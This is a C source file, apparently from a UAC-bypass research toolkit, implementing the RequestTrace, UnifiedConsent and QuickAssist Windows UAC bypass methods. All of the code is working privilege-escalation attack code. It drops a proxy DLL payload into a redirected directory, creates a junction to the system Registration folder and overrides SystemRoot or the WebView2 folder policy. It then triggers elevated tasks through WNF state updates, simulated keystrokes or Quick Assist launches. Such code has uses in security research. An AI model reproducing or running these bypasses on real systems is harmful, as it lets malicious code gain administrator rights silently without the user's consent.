/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025 - 2026
*
*  TITLE:       R41N3RZUF477.C
*
*  VERSION:     3.71
*
*  DATE:        21 Jul 2026
*
*  UAC bypass methods from R41N3RZUF477.
*
*  For description please visit original URL
*
*  https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
*  https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
*  https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "encresource.h"

BOOL ucmxTriggerTaskWNF(
    _In_ PWNF_STATE_NAME state
)
{
    NTSTATUS status;
    ULONG info = 0;

    status = NtQueryWnfStateNameInformation(state,
        WnfInfoStateNameExist,
        NULL,
        &info,
        sizeof(info));

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    info = 0;
    status = NtQueryWnfStateNameInformation(state,
        WnfInfoSubscribersPresent,
        NULL,
        &info,
        sizeof(info));

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    status = NtUpdateWnfStateData(state,
        NULL,
        0,
        NULL,
        NULL,
        0,
        0);

    return NT_SUCCESS(status);
}

BOOL ucmxCreateRegistrationJunction(
    _In_ WCHAR* BasePath
)
{
    BOOL bResult = FALSE;
    WCHAR szJunctionPath[MAX_PATH * 2];
    WCHAR szRegDb[MAX_PATH * 2];
    HANDLE directoryHandle = NULL;

    UNICODE_STRING      usDirectoryName;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    if (_strlen(BasePath) > 100)
        return FALSE;

    _strcpy(szJunctionPath, L"\\??\\");
    _strcat(szJunctionPath, BasePath);
    supConcatenatePaths(szJunctionPath, REGDB_DIR, MAX_PATH);

    do {
        // %systemroot%\Registration
        _strcpy(szRegDb, L"\\??\\");
        _strcat(szRegDb, USER_SHARED_DATA->NtSystemRoot);
        supConcatenatePaths(szRegDb, REGDB_DIR, MAX_PATH);

        RtlInitUnicodeString(&usDirectoryName, szJunctionPath);
        InitializeObjectAttributes(&ObjectAttributes, &usDirectoryName,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        if (!NT_SUCCESS(supCreateDirectory(
            &directoryHandle,
            &ObjectAttributes,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)))
        {
            break;
        }

        if (!supSetMountPoint(directoryHandle,
            szRegDb,
            L""))
        {
            break;
        }

        bResult = TRUE;

    } while (FALSE);

    if (directoryHandle)
        NtClose(directoryHandle);

    if (!bResult) {
        supRemoveDirectory(szJunctionPath);
    }

    return bResult;
}

BOOL ucmxDeleteRegistrationJunction(
    _In_ WCHAR* BasePath
)
{
    WCHAR szJunctionPath[MAX_PATH * 2];
    HANDLE directoryHandle;

    _strcpy(szJunctionPath, BasePath);
    supConcatenatePaths(szJunctionPath, REGDB_DIR, MAX_PATH);
    directoryHandle = supOpenDirectoryForReparse(szJunctionPath);
    if (directoryHandle) {
        supDeleteMountPoint(directoryHandle);
        NtClose(directoryHandle);
        return supRemoveDirectory(szJunctionPath);
    }

    return FALSE;
}

#define WNF_SHEL_TRACE_REQUESTED    0x0D83063EA3B8F075
#define WNF_UC_CONSENT_ITEM_CHANGED 0x41C60D38A3BC0875

NTSTATUS ucmRegistrationProxyExecute(
    _In_ LPCWSTR ProxyDllName,
    _In_ PWNF_STATE_NAME StateName,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fDirCreated = FALSE, fJunctionCreated = FALSE;
    BOOL fEnvSet = FALSE, fUseSendInput = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    SIZE_T nLen, payloadDirNameLen = 0;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR szPayloadDir[MAX_PATH * 2];
    UNICODE_STRING uStrTaskhost = RTL_CONSTANT_STRING(TASKHOSTW_EXE);

    INPUT inputs[8];

    do {

        //
        // Create %TEMP%\Registration junction -> %SystemRoot%\Registration.
        //
        ucmxDeleteRegistrationJunction(g_ctx->szTempDirectory);
        if (!ucmxCreateRegistrationJunction(g_ctx->szTempDirectory))
            break;

        fJunctionCreated = TRUE;

        //
        // Create redirected %TEMP%\System32 directory.
        //
        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
        payloadDirNameLen = _strlen(szPayloadDir);

        if (!CreateDirectory(szPayloadDir, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        fDirCreated = TRUE;

        //
        // Drop payload.
        //
        _strcat(szPayloadDir, TEXT("\\"));
        _strcat(szPayloadDir, ProxyDllName);

        if (!supWriteBufferToFile(
            szPayloadDir,
            ProxyDll,
            ProxyDllSize))
        {
            break;
        }

        //
        // Override %SystemRoot%.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);

        nLen = _strlen(szBuffer);
        if (szBuffer[nLen - 1] == L'\\')
            szBuffer[nLen - 1] = 0;

        fEnvSet = supSetEnvVariable(
            FALSE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT,
            szBuffer);

        if (!fEnvSet)
            break;

        //
        // Kill elevated taskhost instances.
        //
        supEnumProcessesForSession(
            NtCurrentPeb()->SessionId,
            (pfnEnumProcessCallback)supEnumTaskhostTasksCallback,
            (PVOID)&uStrTaskhost);

        fUseSendInput = (StateName->Value == WNF_SHEL_TRACE_REQUESTED);

        //
        // Trigger task via WNF
        //
        if (!ucmxTriggerTaskWNF(StateName)) {

            //
            // Trigger shell trace task by input.
            //
            if (fUseSendInput) {
                RtlSecureZeroMemory(inputs, sizeof(inputs));

                //
                // Simulate Shift+Ctrl+Win+T.
                //
                inputs[0].type = INPUT_KEYBOARD;
                inputs[0].ki.wVk = VK_LSHIFT;

                inputs[1].type = INPUT_KEYBOARD;
                inputs[1].ki.wVk = VK_LCONTROL;

                inputs[2].type = INPUT_KEYBOARD;
                inputs[2].ki.wVk = VK_LWIN;

                inputs[3].type = INPUT_KEYBOARD;
                inputs[3].ki.wVk = 'T';

                inputs[4].type = INPUT_KEYBOARD;
                inputs[4].ki.wVk = 'T';
                inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

                inputs[5].type = INPUT_KEYBOARD;
                inputs[5].ki.wVk = VK_LWIN;
                inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

                inputs[6].type = INPUT_KEYBOARD;
                inputs[6].ki.wVk = VK_LCONTROL;
                inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;

                inputs[7].type = INPUT_KEYBOARD;
                inputs[7].ki.wVk = VK_LSHIFT;
                inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;

                SendInput(RTL_NUMBER_OF(inputs), inputs, sizeof(INPUT));
            }
        }

        Sleep(5000);
        MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Restore environment.
    //
    if (fEnvSet) {
        supSetEnvVariable(
            TRUE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT,
            NULL);
    }

    //
    // Remove payload.
    //
    if (fDirCreated) {
        DeleteFile(szPayloadDir);
        szPayloadDir[payloadDirNameLen] = 0;
        supRemoveDirectory(szPayloadDir);
    }

    //
    // Remove Registration junction.
    //
    if (fJunctionCreated) {
        ucmxDeleteRegistrationJunction(g_ctx->szTempDirectory);
    }

    return MethodResult;
}

/*
* ucmUnifiedConsentMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
*
*/
NTSTATUS ucmUnifiedConsentMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    WNF_STATE_NAME state;

    state.Value = WNF_UC_CONSENT_ITEM_CHANGED;
    return ucmRegistrationProxyExecute(UNIFIEDCONSENT_DLL, &state, ProxyDll, ProxyDllSize);
}

/*
* ucmRequestTraceMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
*
*/
NTSTATUS ucmRequestTraceMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    WNF_STATE_NAME state;

    state.Value = WNF_SHEL_TRACE_REQUESTED;
    return ucmRegistrationProxyExecute(PERFORMANCETRACEHANDLER_DLL, &state, ProxyDll, ProxyDllSize);
}

/*
* ucmxModifyWebviewExecutableFolderPolicy
*
* Purpose:
*
* Alter WebView BrowserExecutableFolder parameter.
*
*/
BOOLEAN ucmxModifyWebviewExecutableFolderPolicy(
    _In_ LPCWSTR lpPayloadPath
)
{
    BOOLEAN bResult = FALSE;
    HKEY hKey = NULL;

    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER,
        T_WEBVIEW_POLICY,
        0, NULL,
        REG_OPTION_VOLATILE,
        MAXIMUM_ALLOWED,
        NULL,
        &hKey,
        NULL))
    {
        bResult = (RegSetValueEx(hKey,
            QUICKASSIST_EXE,
            0, REG_SZ,
            (const BYTE*)lpPayloadPath,
            ((DWORD)_strlen(lpPayloadPath) * sizeof(WCHAR)) + sizeof(UNICODE_NULL)) == ERROR_SUCCESS);

        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* ucmxRunQuickAssist
*
* Purpose:
*
* Execute quick assist through direct exe start or protocol.
*
*/
HANDLE ucmxRunQuickAssist()
{
    WCHAR szBuffer[MAX_PATH * 2];
    SHELLEXECUTEINFO shinfo;

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, QUICKASSIST_EXE);

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpVerb = NULL;
    shinfo.lpParameters = NULL;
    shinfo.nShow = SW_MINIMIZE;

    if (GetFileAttributes(szBuffer) != INVALID_FILE_ATTRIBUTES) {
        shinfo.lpFile = szBuffer;
    }
    else {
        shinfo.lpFile = T_QUICKASSIST;
    }

    if (ShellExecuteEx(&shinfo)) {
        return shinfo.hProcess;
    }

    return NULL;
}

/*
* ucmQuickAssistMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
*
*/
NTSTATUS ucmQuickAssistMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fDirCreated = FALSE, fEnvSet = FALSE;
    HANDLE hProcess;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szPayloadPath[MAX_PATH * 2];
    WCHAR szPayloadFile[MAX_PATH * 2];

    do {

        //
        // Select payload entry point.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_QASSIST,
            FALSE))
        {
            break;
        }

        //
        // Create destination dir "EBWebView\x64" in %temp%.
        //
        _strcpy(szPayloadPath, g_ctx->szTempDirectory);
        _strcat(szPayloadPath, WEBVIEW_DIR);
        if (!CreateDirectory(szPayloadPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szPayloadPath, L"\\x64");
        if (!CreateDirectory(szPayloadPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        //
        // Drop payload and alter it version info block.
        //
        _strcpy(szPayloadFile, szPayloadPath);
        _strcat(szPayloadFile, TEXT("\\"));
        _strcat(szPayloadFile, EMBEDDEDBROWSERWEBVIEW_DLL);
        if (!supWriteBufferToFile(szPayloadFile, ProxyDll, ProxyDllSize))
            break;

        fDirCreated = TRUE;

        if (!supReplaceVersionInfo(szPayloadFile, (PBYTE)g_webviewvsinfo, sizeof(g_webviewvsinfo), 'qass'))
            break;

        //
        // Relay WebView.
        //
        if (!ucmxModifyWebviewExecutableFolderPolicy(szPayloadPath)) {
            fEnvSet = supSetEnvVariable(FALSE, T_VOLATILE_ENV, WEBVIEW2_FOLRDER_VAR, g_ctx->szTempDirectory);
            if (fEnvSet == FALSE)
                break;
        }

        //
        // Run quick asssist.
        //
        hProcess = ucmxRunQuickAssist();
        if (hProcess) {
            if (WaitForSingleObject(hProcess, 15000) != WAIT_OBJECT_0) {
                TerminateProcess(hProcess, 0);
            }
            CloseHandle(hProcess);
        }

        MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    supSetGlobalCompletionEvent();

    Sleep(1000);

    if (fEnvSet)
        supSetEnvVariable(TRUE, T_VOLATILE_ENV, WEBVIEW2_FOLRDER_VAR, NULL);

    if (fDirCreated) {
        _strcpy(szPayloadPath, g_ctx->szTempDirectory);
        _strcat(szPayloadPath, WEBVIEW_DIR);
        supRemoveDirectoryRecursive(szPayloadPath);
    }

    return MethodResult;
}
